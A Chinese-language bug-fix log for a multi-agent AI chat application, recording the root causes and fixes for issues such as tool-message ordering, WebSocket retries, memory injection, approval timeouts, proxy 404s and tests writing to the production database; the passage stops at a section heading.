# 错误原因与修复记录

> 本文件记录开发过程中遇到的报错及其根因、修复方式，便于排查同类问题。

---

## 1. OpenAI tool 消息孤儿引用 → 工具调用死循环（后端）

**报错（API 400）：**
```
Messages with role 'tool' must be a response to a preceding message with 'tool_calls'
```

**现象：** AI 反复调用同一个工具（如 `query_tool_details`、审批类工具），`model_runner` 进入 `TOOL-LOOP max_turns=25` 死循环。

**根因：** `modules/thinking/core/model_runner.py` 工具循环中消息顺序错误：
- `query_tool_details` 与部分控制工具（`request_skill`/`stop_skill`/`list_skills`/`stop_task`）的**结果**先被追加为 `role="tool"` 消息（带各自的 `tool_call_id`）
- 但声明这些调用的 **assistant 消息**只包含 `normal_calls`，且是在结果**之后**才追加

OpenAI API 严格校验：**每条 `tool` 消息的 `tool_call_id` 必须在前序 assistant 消息的 `tool_calls` 中声明过**。校验失败 → API 400 → 工具结果从未真正回到模型 → 模型只能重复调用 → 死循环。

**修复：**
1. 在工具处理之前构建 assistant 消息，`tool_calls` 声明本轮所有会产生结果的调用：
   `normal_calls + query_calls + result_control_calls`
2. 删除 normal 块中重复的 assistant 追加
3. 控制工具异常路径补错误 tool 响应（已声明的调用必须应答）
4. 不产生结果的调用（`continue_thinking`/`respond_to_user`/`delegate_task`/`request_mode_change`/`ask_user_intent`/`create_supervisor`）**不写入** `tool_calls`，避免反向错误

**验证：** 4 个场景断言测试通过——每个 `tool` 消息的 id 都有前序 `assistant.tool_calls` 声明。

**同类排查：** 全仓库检索确认 `role="tool"` 消息仅此一处构造（`tests/test_model_clients.py` 为测试文件）。

---

## 2. 分类记忆工具加载失败 — 悬空引用（后端）

**报错（WARNING，非致命）：**
```
分类记忆工具加载失败: No module named 'modules.memory.tools'
```

**根因：** `infra/tool_manager/tools/__init__.py` 残留旧架构的死引用：
```python
importlib.import_module("modules.memory.tools.classified_memory_tool")
```
该文件曾在旧结构（`modules.infra.*`、`modules.memory.classification_memory`）下存在，仓库重构后已删除，引用未清理。功能已被新记忆工具取代：`memory_match`、`memory_score`、`memory_batch_filter`、`event_query`。

**修复：** 删除死引用代码块，保留注释说明。

**验证：** 工具包导入正常，87 个工具注册，记忆工具齐全，无告警。
**同类排查：** 自动化扫描 `modules.*`/`infra.*`/`backend.*`/`api.*` 全部 import 引用，无其他悬空模块。

---

## 3. WebSocket 发送无重试 → 消息静默丢失（前端）

**现象：** 发送消息后界面一直"正在思考"（加载态），但后台其实已回复；按"停止"无效。

**根因：** Vue `stores/chat.js` 的 `sendMessage` 在 WS 未就绪/首次连接失败时只发送一次，`send()` 返回 `false` 后**静默丢弃**消息（纯 JS 版有最多 8s 重试，Vue 迁移时漏掉）：
- input 没到后端 → 永远加载
- stop 也发不出去 → "按停止还在继续"

**修复：**
- `_ensureConnected()` + `_sendWithRetry()`（最多等 8s 重发）
- 连接看门狗：处理中断开 → 复位加载态 + toast 提示
- `ack busy`（后端正忙会丢弃 input）→ 2.5s 后自动重发 `retryLastInput()`
- stop 后设 `stopped` 标志，忽略后端补发的 `message` 事件

**同类修复：** `approve`/`answerIntent`（审批/提问响应）同样改用 `_sendWithRetry`；`stores/cortex.js` 的 `_sendWithRetry` 增加重连尝试。

---

## 4. 虚拟滚动 → 新消息不渲染（前端）

**现象：** AI 回复已到达但页面不显示，仍停留在加载态。

**根因：** `vue-virtual-scroller` 的 `DynamicScroller` 只渲染标记为 `active` 的项，新追加消息若未被判定 active 则**不渲染**；`scrollToItem` 对动态高度内容不可靠。

**修复：** Chat / CortexChat 两页改为普通滚动容器（`scrollTop = scrollHeight`），每条消息必定渲染。
**补充：** 为避免超长会话一次性渲染全部 DOM，加入分批渲染——最多同时渲染 50 条，超出时顶部「加载更早消息」按钮每次再加载 50 条（滚动锚定不跳位）；自动滚动仅在用户接近底部时触发。

---

## 5. 停止按钮只改 UI 不通知后端（前端）

**现象：** 按停止后界面停止，但后端继续生成，随后补发的回复又出现在界面。

**根因：**
- `stores/cortex.js` 的 `stopGeneration()` 只设本地标志，**未发送 `{type:'stop'}`** 给后端
- chat store 的 stop 已发 stop，但需抑制后端补发的尾部 `message`

**修复：**
- cortex `stopGeneration()` 补发 `{type:'stop'}`
- chat store 用 `stopped` 标志抑制停止后的尾部回复

---

## 6. 原生 confirm/prompt 阻塞 Qt WebEngine（前端）

**现象：** 桌面客户端（Qt WebEngine）中删除/确认弹窗"点了没反应"。

**根因：** 原生 `confirm()`/`prompt()` 会阻塞整个 JS 引擎，对话框未关闭时所有点击无响应。

**修复：** 新建 `useDialog` composable + `DialogHost.vue`（页内弹层 + Promise，永不阻塞），替换全站原生调用（Chat/CortexChat/Memory/Settings）。

---

## 7. 界面使用 emoji 违背 CSS 图标约定

**现象/根因：** 项目约定使用纯 CSS/Lucide SVG 图标（clip-path 头像、Lucide stroke 图标），迁移 Vue 时误用了约 60 处 emoji。

**修复：** 新建 `Icon.vue`（Lucide SVG 路径，`currentColor` 可着色），全站替换 emoji；深色代码块主题用 `[data-theme="dark"]` 作用域 CSS。

---

## 8. 新建会话无效（前端）

**现象：** 点击「新建会话」后界面清空，但继续对话仍写入**旧会话**。

**根因：** Vue `stores/chat.js` 的 `init()` 只清空消息列表，**未清空 `session.sessionId`、未断开旧 WebSocket**：
- 旧 WS 仍连接着旧会话，`sendMessage` 检测到 `connected` 为真就不重连
- 新消息发到旧会话 → 等于没新建

纯 JS 版 `newSession()` 正确做了 `_sessionId=null` + `WS.disconnect()`。

**修复：** `init()` 增加：
1. `ws.wsClient.disconnect()`（断开旧连接，防止自动重连旧会话）
2. `session.sessionId = null`（下次发送时懒创建新会话）
3. `session.currentTitle = '新会话'`、清空 `_lastInput`

**验证：** 新建会话后发送 → 创建新 `session_id` 并加入会话列表，与旧会话隔离。

---

## 9. 无关历史记忆注入污染上下文（后端）

**现象：** 新建会话后只发送一个"1"，系统提示词里仍注入 5 条**无关**的历史记忆（如之前"在 /Users/abc/123 建网站"的任务）。

**根因：**
1. 记忆检索 `EventRetrieval.retrieve()` 用 FAISS 向量搜索，对**无语义内容的短查询**（如"1"）仍返回 top-k 记忆
2. `MIN_SEMANTIC_SIMILARITY=0.20` 阈值过宽松：短查询的 embedding 几乎不与任何记忆正交，都能通过
3. `_rank_and_filter` 归一化后 top-1 恒为 1.0，必过阈值
4. 且 `importance` 权重 0.20 单凭高分记忆（如 importance=1.0 → 0.20 分）就能越过阈值
→ 无关但重要的历史记忆总是被注入，污染上下文、误导模型

**修复（会话记忆优先 + 标注区分）：**
- 记忆检索改为**会话优先**：先取本会话（`session_id`）产生的事件作为"会话记忆"，**优先展示、重要性更高**
- **无会话记忆时不注入事件记忆**：新建会话（无本会话历史事件）时跳过全局事件记忆检索，不再拖入无关历史
- **标注区分**：注入时明确分为两段——
  - `【当前会话记忆】`：本会话产生的事件（优先展示）
  - `【过去发生的事】`：全局事件记忆，每条**标注日期**（`YYYY-MM-DD`）
- 有会话记忆时才补充全局相关事件记忆（agent 路径补语义检索，chatonly 路径补深度回忆 + 语义检索）
- 显式 `_memory_focus`（用户主动要求召回）始终执行
- 改动：`modules/thinking/core/continuous_thinker.py` + `backend/chat/continuous_thinker.py`

**会话记忆实现方式（调查结论）：**
1. 事件存于 `EventStore`（SQLite + FAISS），`MemoryEvent` 带 `session_id` 字段
2. 任务后提取事件时（`api_stream._post_task_extraction` → `EventReducer.reduce(session_id, ...)`），每条事件被标记 `ev.session_id = session_id`（`event_reducer.py:139`）
3. 提示词注入时（`continuous_thinker.py`），会话记忆 = `store.list_events(500)` 按 `session_id == self._session_id` 过滤
4. 注意：库里 281 条事件中 266 条 `session_id` 为空（旧路径创建），仅 15 条带会话标记——新会话需经过几轮对话产生事件后才会有"当前会话记忆"

**验证：** 两处语法 OK；模拟输出：会话事件标`【当前会话记忆】`，全局事件标`【过去发生的事】`并带日期。

**同类排查：** 两条记忆注入路径（agent / chatonly）均已改为会话优先；`event_query`/`memory_score` 等**工具**检索保留原行为（模型显式调用）。

---

## 10. 交互等待超时（ask_user_intent / 审批）

**现象：** AI 询问用户选择选项（ask_user_intent）或等待审批时，用户未及时操作会超时，AI 擅自继续。

**根因：** 交互等待使用了 `USER_REVIEW_TIMEOUT=120`（120 秒）超时：
- 安全门控审批（`tool_security_gate.py`）120s 后自动拒绝
- 模式切换审批（`model_runner._handle_mode_change_request`）120s 后按拒绝处理

**修复（改为无限等待，由用户显式决定）：**
- `tool_security_gate.py`：审批 `asyncio.wait_for(future, timeout=None)`，不再自动超时拒绝
- `model_runner._handle_mode_change_request`：同样 `timeout=None`
- `model_runner._wait_for_user_response`（ask_user_intent）：挂起全局计时器（`Suspension.suspend/resume`）+ 无限等待，等待期间不消耗思考/轮次计时

**验证：** 四处语法 OK；等待期间计时器暂停，用户可无限期操作选项/审批，直到显式点击。

---

## 11. 审批结果未回传模型 + 黑板生命周期问题

### 11.1 审批通过结果未回传大模型（后端）

**现象：** 用户批准/拒绝后，大模型不知道是否经过了审批流程，只知道工具执行了。

**根因：** `gate.check` 返回 `(True, "用户批准: ...")` 后，model_runner 只把**工具执行结果**追加为 tool 消息，`reason`（审批通过信息）被丢弃。发起审批的模型只看到"文件创建成功"，不知道"经过了用户审批"。

**修复**（`model_runner.py` 工具执行后）：
```python
if reason and reason.startswith("用户批准"):
    result = f"[用户审批已通过] {reason}\n{result}"
```
- 通过：tool 消息前置 `[用户审批已通过] 用户批准: ...`
- 拒绝：`[安全门控拦截] 用户拒绝: ...`（原有）

**验证**：tool 消息配对校验通过（不会 400 orphan）；审批信息保留在 tool 消息中，下一轮 API 调用传给模型。

### 11.2 黑板生命周期（结论：per-turn 一次性）

- **每次用户对话** → 新建 `CognitiveBlackboard`（新 turn_id），对话结束 finally 清理 manager
- 一次思考内的多轮工具循环共享黑板，observations 累积其中
- **跨对话不累积**——对话历史靠 `context`（会话消息历史）每轮重新注入，不靠黑板

### 11.3 黑板复用竞态修复（后端）

**问题：** `remove_runner_manager` 原为 `asyncio.create_task`（异步），短间隔两次对话时旧 manager 未清理，`get_runner_manager` 复用旧 manager + **旧黑板**（对话历史/expert_findings 全过期）。

**修复：**
- `get_runner_manager`（model_runner.py:2784）复用时**更新** manager 的 `blackboard`/`turn_context`，并同步到所有 runner
- `multi_model_orchestrator.py` finally 改 `await remove_runner_manager`（同步清理）

**验证：** 复用返回同一 manager，但 `blackboard` 已更新为新黑板 ✓

### 11.4 旧 observation 清理（后端）

**问题：** blackboard `observations` 无上限，长轮次思考会无限累积。

**修复**（`blackboard.py`）：
- 加 `MAX_OBSERVATIONS = 200` 类常量
- `add_observation` 超限时删除最旧的（读取方只取最近 5 条，删旧的不影响推理）

**验证：** 250 次观察 → 保留 200 条，最旧 50 条被清 ✓


## 12. 前端裸 fetch 路径在 8765 静态代理下全部 404（前端）

**现象：** 编排图页显示"暂无该层 Agent"、编排页/技能页/会话设置数据不加载；浏览器 Network 面板对应请求 404。

**报错（浏览器 Console）：**
```
TypeError: Failed to fetch dynamically imported module: http://localhost:8765/assets/xxx.js
```
（此为另一类：构建后旧 chunk 失效，见 12.2）

**根因：** 前端 SPA 由 `frontend/server.py`（端口 8765）静态服务，它**只代理 `/api/*` 到后端 8080 并去掉 `/api` 前缀**。新增页面代码直接写裸路径：
```js
fetch('/management/orchestration')   // ❌ 8765 不代理 /management → 404
fetch('/config/persona/...')          // ❌ 同样 404
fetch('/stream/session/...')          // ❌ 同样 404
```
而走 `endpoints.*` 封装（api.js `BASE='/api'`）或 `fetch('/api/...')` 才经代理正常。

实测：
- `8765/management/orchestration` → **404**
- `8765/api/management/orchestration` → **200**（代理去前缀到 8080）
- `8080/api/management/orchestration` → 401（8080 无 `/api` 路由，**不能直接用 8080 的 /api**）

**修复：** 前端所有裸 `fetch('/management|/config|/stream|/tools/...')` 统一加 `/api/` 前缀（8765 代理去前缀到 8080）。涉及 8 个文件：Graph.vue、Orchestration.vue、Skills.vue、SessionSettings.vue、ScheduledTasks.vue、Dashboard.vue、Settings.vue、ChatMessage.vue。

**关键约定（写前端代码务必遵守）：**
1. **所有后端 API 请求必须用 `/api/` 前缀**（或走 `endpoints.*` 封装）——8765/vite 代理都会去掉 `/api` 转到 8080；裸路径在 8765 直接 404
2. **WebSocket 例外**：`ws/client.js` 直连 `:8080/stream/ws/{sid}`（8765 无 WS 转发），不要改成 8765
3. **`/audio`、`/pet` 资源保留裸路径**（分别由后端静态/桌宠使用，不受代理影响）
4. **不可用 8080 直接拼 `/api/`**——后端路由无 `/api` 前缀，会 401

**验证：** 修复后各页面数据加载正常；`grep -rnE "fetch\\('/(?!api/)"` 无残留裸 fetch。

### 12.1 同类：懒加载 chunk 404（构建更新后旧页面白屏）

**现象：** `npm run build` 后，已打开的旧页面导航到懒加载路由报：
```
Error: Unable to preload CSS for /assets/Graph-xxx.css
TypeError: Failed to fetch dynamically imported module: /assets/Graph-xxx.js
```

**根因：** Vite 构建产物带内容 hash，重建后旧 hash 的 chunk 被删除；浏览器旧页面内存中的模块图仍引用旧 hash，导航触发动态 import 即 404。

**修复：**
- `frontend/src/router.js` 加 `router.onError`：识别 `Failed to fetch dynamically imported module` / `Unable to preload CSS` 时自动 `location.reload()` 拉最新 index.html + chunk
- `frontend/server.py` 对 `/assets/*` 设 `Cache-Control: public, max-age=31536000, immutable`（hash 文件不变内容不变）；`index.html` 保持 `no-cache`（每次拿最新，引用最新 chunk 列表）

**经验：** 改完后端/前端记得重新 `npm run build`；已打开旧页面的用户需刷新一次；构建更新后懒加载失败会自动刷新恢复。


## 13. settings 双重 @property → 多 Agent 思考崩溃（后端）

**报错：**
```
TypeError: 'property' object is not callable
```

**现象：** agent 模式对话时 `continuous_thinker think_once` 反复异常，总指挥永远无法委托主管/专家（主管/专家实例不创建）。

**根因：** `config/settings.py` 的 `is_delegation_available` 前有**两个 `@property` 叠加**：
```python
@property          # ← 多余：装饰的是下一行的 @property 对象

@property
def is_delegation_available(self) -> bool:
    return True
```
外层 `@property` 把内层的 **property 对象**当作 getter → 访问 `settings.is_delegation_available` 时调用 getter（property 对象）→ `'property' object is not callable`。任何读取该配置的代码（`model_runner` 工具注入、委托判定）全部崩溃。

**修复：** 删除多余的 `@property`（只保留装饰方法的那一个）。

**验证：** `settings.is_delegation_available` 返回 `True`；agent 模式总指挥完整思考、专家实例正常创建。

**同类排查：** `grep -nB1 "def " config/settings.py | grep @property` 确认无其他重复装饰器。

**经验：** 连续两行相同装饰器叠加会产生极难定位的 `'property' object is not callable`——它既不是真正的属性访问也不是方法调用。凡是 `@xxx` 装饰器，检查其下一行是否紧贴一个函数（空行/另一装饰器都会出错）。


## 14. 会话图谱 return_to 节点 tier 为空 → 节点/边被布局丢弃（前端/后端）

**现象：** 会话图谱里某些 Agent 节点不显示、相关呼唤/回复边丢失；偶发把未知层级节点误标为"实现专家"（橙色）。

**根因（两层）：**
1. **后端** `session_graph.py` 的 `record` 创建被回复方（`return_to`）节点时 `tier` 默认空字符串——若该节点从未作为发言者出现过，tier 一直为空；
2. **前端** `Graph.vue` 布局只按 4 个已知 tier（user/large/supervisor/expert）分列，空 tier 节点**不落入任何列 → 没有坐标** → 节点不渲染、以它为端点的边被 `if (!f || !t) continue` 跳过；同时 `tierOf('')` 回退到 `expert` 误标橙色。

**修复：**
- 后端：按发言者层级**推断上级层级**（`expert→supervisor→large→user`）填充 return_to 节点 tier；
- 前端：`layout` 增加"未知"列兜底（灰色 `bot` 图标），`tierOf` 未知值返回灰色"未知"而非回退到 expert。

**验证：** node 模拟 5 场景（完整链 / 只有总指挥 / 5 专家 / 未知 tier / 空图）——无 NaN 坐标、无同列重叠、无越界、unknown 节点/边不丢失。

**同类排查：** 前端所有"按枚举分列/映射颜色"的逻辑，对**未知枚举值必须显式兜底**，且兜底值不应是某个真实业务枚举（避免误标）。

**经验：** 数据驱动渲染的经典坑——**字段缺失/空值 vs 前端枚举不匹配**，前端枚举必须允许未知值并给中性样式；后端造节点时尽量把展示字段（tier/label）补全。


## 15. 补充历史经验（此前未记录）

### 15.1 限流额度被高频轮询耗尽 → 正常操作 429（后端）

**现象：** 健康检查/桌宠轮询后，用户正常打开页面也报"请求频率超限"，日志刷 `限流触发: 127.0.0.1 (GET /xxx)`。

**根因：** `api/main.py` 限流中间件每 IP 每分钟 100 次，白名单只有 `/stream/pet/move`；`/health`（每秒多次）+ 桌宠轮询（`last-reply`/`state`）把额度耗尽，之后所有请求 429。

**修复：** ① 高频只读轮询端点（`/health`、`/stream/pet/*`、`/stream/status`、`/stream/sessions`、`/config`、`/dashboard`、`/metrics`）加入限流白名单；② 本地回环（127.0.0.1/::1）上限放宽到 1000/分钟，公网仍 100。

**同类排查：** 加新端点时区分"高频轮询（只读状态）"与"业务操作"——前者应进限流白名单/日志忽略名单，否则会互相挤占额度。

### 15.2 macOS 截图 could not create image from display（后端）

**现象：** 终端反复打印 `could not create image from display`（每次截图一次）。

**根因（两层）：**
1. macOS 上 `PIL ImageGrab.grab()` 走 X11，主动打印该错误到 fd（`except` 拦不住）；
2. 回退的 `screencapture` 子进程错误输出未捕获，直接继承到父终端。

**修复：** `utils/screen_capture.py` macOS 跳过 ImageGrab 直接用 `screencapture`，`subprocess.run(..., capture_output=True)` 捕获子进程输出；`_try_screencapture` 用 `try/finally` 删除临时文件（曾泄漏 3.8 万个临时 png）。

**同类排查：** 所有 `subprocess.run` 未捕获 stdout/stderr 的调用——子进程错误会泄漏到父进程终端。

### 15.3 时段判断用字符串比较 → 跨午夜永不触发（后端）

**现象：** 主动搭话 `time_windows` 配 `22:00-02:00`（跨午夜）永不触发。

**根因：** `_check_time_windows` 用 `start <= cur <= end` **字符串比较**——`"23:38" <= "02:00"` 恒 False。

**修复：** 改为分钟数数值比较，`end < start` 视为跨午夜（`cur >= s or cur <= e`）。

**同类排查：** 任何 `"HH:MM"` 时间比较都应转分钟数再比，字符串比较在跨天/整点边界必然出错。

### 15.4 模板误用未定义变量（前端）

**现象：** 打开因果图/编排图报 `Cannot read properties of undefined (reading 'type'/'color')` → ErrorBoundary 显示"页面加载失败"。

**根因：** 模板里 `v-for="node in ..."` 但表达式写 `{{ n.type }}` / `n.color`（变量名笔误 `n` vs `node`）——Vue 编译不报未定义变量，运行时渲染才崩。

**修复：** `n` → `node`（Causal.vue / Graph.vue 共 7 处）。

**同类排查：** 写脚本提取模板根标识符对照 script 定义 + v-for 局部变量，唯一真 bug 模式是"v-for 变量笔误"；`:style`/`:class` 对象键、箭头函数参数、`(v,k)` 第二变量均为误报。

**经验：** Vue 模板未定义变量在构建期不报错、运行期才崩——新增/重构页面后**务必打开每个页面实测**，或跑模板变量静态检查。


## 16. 黑板共享记忆：角色别名不匹配（后端）

> 归档自 `docs/MEMORY_INJECTION.md` 第十节

**现象：** 多模型协作中总指挥看不到 `【协作上下文】`、`【当前委托状态】`、`【当前任务进度记事本】`、`【历史输出】` 等黑板共享片段——专家产出没完整回到总指挥，潜在协作断裂。

**根因：** `TurnContext.view(role)` 按 `role in target_roles` 过滤，而 `continuous_thinker._build_prompt` 里 `role = getattr(self, '_role', 'orchestrator')` 恒为 `'orchestrator'`；但这些片段的 `target_roles=("large",)` → 大模型（总指挥）匹配不上。

**修复**（`modules/thinking/context/pool.py` `view()`）：把 `"large"` 与 `"orchestrator"` 视为**同一角色（总指挥）的两种写法**——查看角色是二者之一时可见含任一别名的片段；supervisor/expert 仍精确匹配。

**验证：** `view('orchestrator')` 返回全部片段；`view('supervisor')` 只返回系统指令+历史记忆；`view('expert')` 只返回历史记忆。

**同类排查：** 全局检索角色字符串常量（`"large"`/`"orchestrator"`/`"supervisor"` 等）是否被硬编码成两种写法且未归一——配置项里同一角色多种叫法极易导致匹配失败。


## 17. 前端重构期已修复 Bug 汇总（旧 JS 版 → Vue 迁移经验）

> 归档自旧版前端重构计划（文档已移除）第五节

### 17.1 `ws.js` 重复函数定义 → 连接失败无人知晓（复制粘贴）
`_scheduleRetry` 定义两次，第二个覆盖第一个（丢失 `_connectReject` 通知）——连接失败调用者永远不知道。
**修复：** 删除第二个定义，保留带通知的版本。

### 17.2 `components.js` 字符串模板 XSS
`UI.e()` 只转义 HTML 实体，onclick 属性是 JS 上下文（需转义 `'` `"` `\` 换行）。修复用 `this.jsStr()` 替代 `this.e()`。

### 17.3 `chat.js` 重复 `_renderMsgShell` → 流式光标丢失（复制粘贴）
第二个定义覆盖第一个（丢 `<div class="streaming-cursor">▊</div>`）。
**修复：** 删除第二个定义。

### 17.4 `ws.js` WebSocket URL 硬编码
`ws://localhost:8080` 硬编码 → 非 localhost 环境连不上。修复从 `window.location.hostname` 动态取。

### 17.5 `app.js` localStorage 无 try/catch
隐私模式下 `localStorage.getItem/setItem` 抛 `SecurityError` 未捕获。修复全站 try/catch 包裹。

### 17.6 CSS 变量缺失
`theme.css`/`layout.css` 引用未声明的 CSS 变量。修复在 `:root` 补全定义。

### 17.7 已知未修复问题（旧 JS 版，Vue 重构后已解决）
API Key 明存 localStorage → 改内存；静默 catch → 各调用处加错误处理；无错误边界 → `<ErrorBoundary>`；删除会话无 API → 补 `DELETE`；版本号硬编码 → 构建注入；重复工具函数 → 统一 `utils/`。

### 17.8 Bug 三大共因（最值得记住的经验）
1. **复制粘贴错误**（3 个 bug）：重复函数/模板互相覆盖。手写 JS 无类型检查、无编译期检测——**Vue SFC + ESLint 可防**。
2. **全局可变状态**（2 个 bug）：散落 `this.xxx` 竞态覆盖——**Vue 响应式 ref + Pinia store 可追踪**。
3. **字符串作为代码**（2 个 bug）：onclick 字符串注入 XSS、字节替换脆弱——**Vue 模板编译 + Vite 构建根治**。


## 18. 设置全局开关是摆设（后端/前端）

**现象：** 设置页「主动搭话 → 启用主动搭话」全局开关开了/关了，触发行为完全不变——用户质疑"真能生效吗"。

**根因：** 三层配置各管一段，但接入不完整：
1. **全局总开关 `PROACTIVE_OUTREACH_ENABLED`**——只在 `setup.py:59` 被**读取用于前端状态显示**，`trigger._get_enabled_outreach_sessions()` 判定时**根本没检查** → 开关改不动任何行为；
2. **会话级配置**（`metadata.outreach`）——唯一被 trigger 判定的 → 只有会话 enabled 才触发；
3. **无全局默认规则**——会话没配置就不触发，无兜底。

**修复（配置体系重构，优先级：全局总开关 > 会话配置 > 全局默认）：**
- `trigger._get_enabled_outreach_sessions()` 入口先检查 `PROACTIVE_OUTREACH_ENABLED`（关闭全停，返回空）
- 新增 `PROACTIVE_OUTREACH_DEFAULT`（JSON 全局默认规则）——**会话未配置（`not cfg`）时回退用全局默认**（含 `enabled` 判断）
- 新增方法 `_get_global_default_rules()`（解析 JSON，容错返回 `{}`）
- `PROACTIVE_OUTREACH_DEFAULT` 加入 `_MODIFIABLE_FIELDS`（否则 PUT /config 报 FORBIDDEN）
- 前端：设置页「主动搭话」= 全局总开关 + 全局默认规则编辑（保存到 DEFAULT）+ 会话规则管理（Outreach 页合并为 compact 子组件）；侧栏移除主动搭话独立入口

**验证：** 全局默认 `{enabled:true, idle:...}` 保存读回正常；14 个未配置会话全部命中全局默认；全局开关关闭时 `_get_enabled_outreach_sessions` 返回空。

**经验（写前端/后端配置时务必遵守）：**
1. **任何"开关/设置"必须真正接入消费方**——只读显示不接判定 = 摆设。加设置时先查谁消费它、判定路径是否引用。
2. **前端可改配置项必须进 `_MODIFIABLE_FIELDS`**——否则 PUT /config/{key} 报 FORBIDDEN（403），用户点了没反应。
3. **三层配置（全局/默认/覆盖）明确优先级**，消费方用同一套解析（`会话配置 if cfg else 全局默认`），避免"配了不生效"困惑。
4. 设置入口与功能页合并（如主动搭话页并入设置）后，侧栏入口要同步移除，避免两处入口、一处失效。
## 19. 自动化替换留下的运行时 NameError + 同名索引重复（后端）

### 19.1 自动化替换未定义 helper → 运行时 NameError

**现象：** 后端启动后 WS 建会话报 `NameError: name '_utcnow' is not defined`（`session_repo.py:44`），前端无法开始对话。

**根因：** 修 `datetime.utcnow()` 弃用警告时用 python 脚本批量替换：
- `s.replace("from datetime import datetime, timedelta", "from datetime import datetime, timedelta, timezone\ndef _utcnow():...")` —— 但文件实际是 `from datetime import datetime`（无 `timedelta`），**第一处 replace 没匹配**，helper 没插入；
- 第二处 `s.replace("datetime.utcnow()", "_utcnow()")` **成功了**，把 7 处调用全部替换成 `_utcnow()`。

结果：调用被替换、定义没加，`py_compile` 通过（语法合法），运行时才炸。

**为什么测试没抓到：** ① NameError 是运行时错误，py_compile 不执行函数体；② 测试套件从未测真实 `SessionRepository`（`test_database` 用 MagicMock、`test_chat_gateway` 用内存版 mock），真实 `create_session/save_message` 路径零覆盖。

**修复：** 补 `_utcnow()` 定义；新增 `tests/test_session_repo.py`（5 用例覆盖 create/save/get/clear/delete 真实实现）。

### 19.2 同名索引重复 → 新建 DB 建表报 already exists

**现象：** 补测试用临时 SQLite 建表时报 `OperationalError: index ix_chat_sessions_last_active already exists`。

**根因：** `chat_models.py` 的 `ChatSession.last_active` 同时声明了 `index=True`（SQLAlchemy 自动生成 `ix_chat_sessions_last_active`）和 `__table_args__` 里显式 `Index("ix_chat_sessions_last_active", "last_active")`，**两个同名索引**。create_all 尝试建两个同名索引，第二次报 already exists。

**为什么真实 DB 没暴露：** 真实 `data/memory.db` 建过一次（表+索引已存在），后续 create_all 幂等跳过；只有**新建数据库**（新部署/测试临时库）才触发。

**修复：** 去掉 `last_active` 的 `index=True`，保留 `__table_args__` 显式 Index。

**同类排查：** AST 扫描所有 Base 模型，检查 `index=True` 列与 `__table_args__` Index 是否生成同名（自动索引名 `ix_<table>_<col>`）。

### 19.3 自动化脚本 replace 的教训（最重要）
- **任何批量文本替换（sed/python replace）改代码，替换后必须运行 + 在真实入口跑一遍**，不能只 py_compile。
- 替换目标的字符串要**精确匹配实际文件内容**（如 `from datetime import datetime` 与 `...timedelta` 不同），替换前先 grep 确认目标存在。
- **辅助函数（helper）替换调用点后，必须确认定义也加入**（成对检查）。
- **被 mock 掩盖的真实实现**：测 mock 路径前先确认被 mock 的核心逻辑有真实测试覆盖。


## 20. 测试假对象与真实模型字段脱节（后端）

**现象：** 感知触发思考（trigger_think）每次触发传给 LLM 的 prompt 完全相同——`"检测到环境高强度变化（perception:）。请自然简短地关心/提醒用户…"`，`perception:` 后面始终是空的。

**根因：** `trigger_think._trigger` 用 `getattr(d, 'description', '')` 构造差异描述，但真实模型 `Difference`（`modules/perception/difference/models.py` 的 dataclass）**根本没有 `description` 字段**——只有 `id/source_type/category/intensity/payload/…`。于是 desc 恒为 `source_type:`（`perception:`），每次触发内容相同。

**为什么测试没抓到：**
1. **测试用自定义假类 `_Diff`**，自己加了 `description="变化"` 属性——假对象"看起来有 description"，掩盖了真实模型缺字段的事实；
2. **测试只断言"是否触发"**（`_run` 被调用、触发次数），**从不检查传给 LLM 的 desc/prompt 内容**——内容空洞这类质量问题，断言根本覆盖不到。

**修复：** `_trigger` 改用真实模型存在的字段——`category` + `payload.target/change_type` 构造可读描述（如 `screen_changed:主窗口`），每次随实际差异变化；新增测试用真实字段结构断言 desc 内容。

**经验（最值得记住）：**
1. **测试输入必须用真实生产模型构造**（或用与其完全一致的字段集），不要自定义"看起来合理"的假类——假对象字段与真实模型不一致时，测试通过但真实运行暴露的恰恰是字段差异。
2. **消费生产数据对象的代码，测试要断言"输出内容质量"**，而不只是"被调用了"——`getattr(x, 'field', default)` 取到默认空值导致内容空洞，只有断言内容才能抓住。
3. 给测试写 fixture 前，先 `grep` 生产模型定义确认字段名，别凭感觉。


## 21. 主动搭话旁路绕过全局/会话开关（后端）+ 测试污染生产库

**现象：** 用户在设置页关闭「主动搭话」全局开关后，感知到屏幕高强度变化/定时任务到点时**仍然收到主动消息**；同时生产库 `data/memory.db` 积累大量 `test_xxx` 前缀的「你好」测试会话。

**根因（两层）：**
1. **旁路绕过三层闸门**：§18 只修了主路径 `ProactiveTrigger._get_enabled_outreach_sessions()`（全局开关 → 会话 enabled → 规则），但另两条触发源完全绕过：
   - `trigger_think.py`（感知触发思考）：只有自己的冷却+强度阈值，**不检查** `PROACTIVE_OUTREACH_ENABLED`，也不检查任何会话是否开启主动搭话——全局关闭后仍广播 proactive 消息；
   - `scheduled_tasks.py::_handle_chat`（定时任务）：只查任务 enabled，**不检查**全局总开关。
2. **测试写生产库**：`tests/unit/test_conversation_memory.py::test_session_context_accumulation` 直接用全局单例 `get_thinking_system()` + 随机 `test_{hex}` 会话 id → `system.start()` 落库到真实 `data/memory.db`，每次跑测试新增一个「你好」会话。

**修复：**
1. 新增模块级三层闸门函数 `modules/perception/trigger.py::outreach_trigger_allowed()`——全局开关关闭或无任何会话开启主动搭话时返回 False；`trigger_think._trigger` 入口接入（第 1、2 层），`scheduled_tasks._handle_chat` 接入全局开关检查。第 3 层（规则标准）仍由各触发源判定。
2. 测试改用临时 SQLite（monkeypatch `sqlite_path` + 独立 `StreamThinkingSystem` + 固定会话 id），绝不触碰生产库；已清理生产库残留 `test_*` 会话（备份 `data/memory.db.bak_pre_test_cleanup`）。

**验证：** 新增单测覆盖「全局关不触发」「无会话开启不触发」；端到端 7 项闸门断言全过；相关测试 71 项通过。

**经验：**
1. **修开关类 bug 要枚举所有触发源**——主路径修好但旁路（感知触发/定时任务）仍绕过 = 用户依旧觉得"开关是摆设"。§18 的三层闸门语义应作为所有主动消息的统一前置。
2. **测试必须隔离生产库**——凡调用 `get_thinking_system()`/`get_session_repo()` 全局单例的测试，都必须先 monkeypatch `sqlite_path` 指向临时库；用完随机 `test_` 前缀会话 id 的测试，本身就是污染源。


## 22. 全按钮审计方法论 + 启动快捷键 shortcut_keys 是摆设（前端/后端）

**任务背景：** 用户要求"完整确认全部前端按钮都是有效果的"——重点抓"点了没反应 / 存了没人读"的摆设按钮。

**审计方法（4 层，可直接复用）：**

### 22.1 层 1：后端路由权威清单
